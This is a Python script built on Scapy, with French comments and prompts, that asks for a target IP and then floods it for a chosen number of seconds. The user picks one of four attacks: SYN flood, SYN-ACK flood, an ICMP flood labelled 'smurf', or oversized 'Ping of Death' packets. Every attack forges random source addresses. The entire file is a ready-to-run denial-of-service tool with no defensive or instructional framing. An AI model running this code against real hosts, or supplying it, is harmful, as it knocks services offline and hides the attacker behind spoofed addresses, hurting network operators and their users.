from scapy.all import IP, ICMP, TCP, send, Raw, conf
import random
import time
import sys

def generate_random_ip():
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))  # Génère des IP valides

def send_packet(packet):
    send(packet, verbose=0)

def attack_syn_flood(target_ip, target_port, duration):
    """SYN Flood Attack"""
    start_time = time.time()
    while time.time() - start_time < duration:
        packet = IP(src=generate_random_ip(), dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send_packet(packet)

def attack_syn_ack(target_ip, target_port, duration):
    """SYN-ACK Flood Attack"""
    start_time = time.time()
    while time.time() - start_time < duration:
        packet = IP(src=generate_random_ip(), dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="SA")
        send_packet(packet)
        
def attack_smurf(target_ip, duration):
    """Smurf Attack"""
    start_time = time.time()
    while time.time() - start_time < duration:
        send_packet(IP(src=generate_random_ip(), dst=target_ip) / ICMP())  # Envoi direct du paquet



def attack_pod(target_ip, duration):
    """Ping of Death (PoD) Attack"""
    start_time = time.time()
    while time.time() - start_time < duration:
        packet = IP(src=generate_random_ip(), dst=target_ip) / ICMP() / Raw(b"A" * 6000)
        send_packet(packet)

def ddos(target_ip, attack_type, duration):
    target_port = 80  # Port standard utilisé pour les attaques TCP
    conf.verb = 0  # Désactiver les messages de sortie Scapy
    if attack_type == "syn_flood":
        attack_syn_flood(target_ip, target_port, duration)
    elif attack_type == "syn_ack":
        attack_syn_ack(target_ip, target_port, duration)
    elif attack_type == "smurf":
        attack_smurf(target_ip, duration)
    elif attack_type == "pod":
        attack_pod(target_ip, duration)
    else:
        print("Type d'attaque inconnu.")

if __name__ == "__main__":
    try:
        target_ip = input("IP cible : ")
        attack_type = input("Type d'attaque (syn_flood, syn_ack, smurf, pod) : ").lower()

        if attack_type not in ["syn_flood", "syn_ack", "smurf", "pod"]:
            print("Type d'attaque non reconnu.")
            sys.exit(1)

        duration = float(input("Durée de l'attaque (en secondes) : "))

        ddos(target_ip, attack_type, duration)

    except KeyboardInterrupt:
        print("\nArrêt par l'utilisateur.")
        sys.exit(0)
    except ValueError:
        print("Veuillez entrer des valeurs numériques valides.")
        sys.exit(1)
